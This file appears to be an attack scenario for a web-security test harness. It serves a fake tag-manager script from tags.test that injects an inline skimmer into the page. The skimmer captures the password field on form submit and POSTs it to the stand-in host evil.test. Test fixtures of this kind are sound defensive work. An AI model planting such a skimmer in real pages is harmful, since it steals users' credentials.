// Attack: the approved tag manager injects an inline skimmer that sends the password on submit.
import * as baseline from './baseline.js';

export function respond(ctx) {
  if (ctx.host === 'tags.test' && ctx.path === '/gtm.js') {
    const skim = `document.addEventListener('submit',function(){var p=document.getElementById('password');if(p)fetch('${ctx.origin('evil.test')}/c',{method:'POST',body:'p='+encodeURIComponent(p.value)});},true);`;
    return { body: `(function(){var s=document.createElement('script');s.text='window.dataLayer=window.dataLayer||[];window.dataLayer.push({event:"pageview"});';document.head.appendChild(s);var k=document.createElement('script');k.text=${JSON.stringify(skim)};document.head.appendChild(k);})();` };
  }
  if (ctx.host === 'evil.test' && ctx.path === '/c') return { body: '' };
  return baseline.respond(ctx);
}
